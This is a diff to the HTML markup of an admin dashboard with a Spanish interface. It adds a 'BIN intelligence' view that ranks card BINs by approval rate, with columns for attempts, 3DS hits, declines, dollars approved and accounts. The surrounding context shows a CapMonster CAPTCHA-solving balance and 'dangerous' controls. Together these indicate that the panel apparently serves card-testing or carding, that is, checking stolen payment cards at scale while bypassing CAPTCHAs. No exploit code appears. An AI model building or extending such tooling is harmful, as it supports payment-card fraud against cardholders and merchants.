@@ -33,6 +33,7 @@
     <button class="nav" data-section="logs" id="navLogs" title="Tripas en vivo del servidor"><span class="i">▤</span>Logs<span class="b" id="navLogsBadge"></span></button>
     <button class="nav" data-section="health" id="navHealth" title="¿Está vivo todo? Aquí lo dice"><span class="i">◉</span>Salud<span class="b ok hidden" id="navHealthBadge">✓</span></button>
     <button class="nav" data-section="admin" id="navAdmin" title="Botones rojos peligrosos — usa con criterio"><span class="i">⚙</span>Controles</button>
+    <button class="nav" data-section="bin-stats" id="navBinStats" title="Inteligencia de BINes — tasa de aprobación por tarjeta sobre todos los intentos"><span class="i">▣</span>BINes</button>
     <div class="grow"></div>
     <div class="sb-status mono">
       <div><span>xCAPTCHA</span><b class="ok" id="stCap" title="Saldo CapMonster — cuando esté en rojo, recarga">—</b></div>
@@ -278,6 +279,39 @@
     </div>
 
     <!-- Vista: Controles backend (SA only) -->
+    <div id="binStatsMain" style="display:none;flex-direction:column;flex:1;min-height:0;overflow-y:auto">
+      <section class="filterbar">
+        <h2>Inteligencia de BINes <span class="dim mono">— tasa de aprobación por tarjeta</span></h2>
+        <div class="grow"></div>
+        <span class="dim mono" id="binStatsTotals"></span>
+        <button class="seg-btn" id="btnBinRefresh" title="Recargar estadísticas">↻ Refrescar</button>
+      </section>
+      <div class="bin-wrap">
+        <div class="bin-chart-card">
+          <div class="bin-chart-head">Tasa de aprobación por BIN <span class="dim">(barra = % aprobado · ancho ~ # intentos)</span></div>
+          <div id="binChart" class="bin-chart"><div class="dim" style="padding:20px">Cargando…</div></div>
+        </div>
+        <div class="bin-table-card">
+          <table id="binStatsTable" class="bin-table">
+            <thead>
+              <tr>
+                <th>BIN</th>
+                <th class="num">Intentos</th>
+                <th class="num">Aprob.</th>
+                <th class="num">Tasa</th>
+                <th class="num">3DS</th>
+                <th class="num">Rechazos</th>
+                <th class="num">$ Aprobado</th>
+                <th class="num">Cuentas</th>
+                <th>Último</th>
+              </tr>
+            </thead>
+            <tbody><tr><td class="loading" colspan="9">Cargando…</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
     <div id="adminMain" style="display:none;flex-direction:column;flex:1;min-height:0;overflow-y:auto">
       <section class="filterbar">
         <h2>Controles del sistema <span class="dim mono">— solo SA</span></h2>
